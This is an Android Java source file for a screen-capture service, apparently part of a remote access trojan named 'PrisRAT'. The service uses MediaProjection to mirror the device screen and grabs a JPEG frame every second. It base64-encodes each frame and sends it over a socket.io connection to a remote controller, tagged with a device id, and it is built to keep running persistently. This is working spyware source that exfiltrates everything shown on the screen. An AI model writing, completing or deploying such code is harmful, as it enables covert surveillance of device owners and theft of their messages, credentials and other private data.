package com.pris.rat.tool;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

import io.socket.client.Socket;

public class ScreenShareService extends Service {
    private static final String TAG = "PrisRAT";
    public static Socket socket = null;
    public static String deviceId = null;
    private static Intent projectionData = null;
    private static int projectionResult = 0;

    private MediaProjection projection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler;
    private boolean running = false;
    private int width, height, density;

    public static void setProjectionData(int result, Intent data) {
        projectionResult = result;
        projectionData = data;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (running) return START_STICKY;
        if (projectionData == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        try {
            MediaProjectionManager mgr = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            projection = mgr.getMediaProjection(projectionResult, projectionData);
            if (projection == null) { stopSelf(); return START_NOT_STICKY; }

            if (Build.VERSION.SDK_INT >= 34) {
                projection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {}
                }, handler);
            }

            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(metrics);
            width = metrics.widthPixels / 2;
            height = metrics.heightPixels / 2;
            density = metrics.densityDpi;

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            virtualDisplay = projection.createVirtualDisplay(
                    "PrisScreen", width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, handler);

            running = true;
            startCapture();
        } catch (Exception e) {
            Log.e(TAG, "Start error", e);
            stopSelf();
        }
        return START_STICKY;
    }

    private void startCapture() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!running) return;
                captureFrame();
                handler.postDelayed(this, 1000);
            }
        }, 1000);
    }

    private void captureFrame() {
        try {
            Image img = imageReader.acquireLatestImage();
            if (img == null) return;

            Image.Plane[] planes = img.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * width;

            Bitmap bmp = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buffer);

            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, width, height);
            bmp.recycle();

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos);
            cropped.recycle();

            byte[] bytes = baos.toByteArray();
            String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
            img.close();

            if (socket != null && socket.connected() && deviceId != null) {
                JSONObject resp = new JSONObject();
                resp.put("id", deviceId);
                resp.put("type", "screen");
                resp.put("image", b64);
                socket.emit("response", resp);
            }
        } catch (Exception e) {
            Log.e(TAG, "Capture error", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
        try {
            if (virtualDisplay != null) virtualDisplay.release();
            if (projection != null) projection.stop();
            if (imageReader != null) imageReader.close();
        } catch (Exception ignored) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}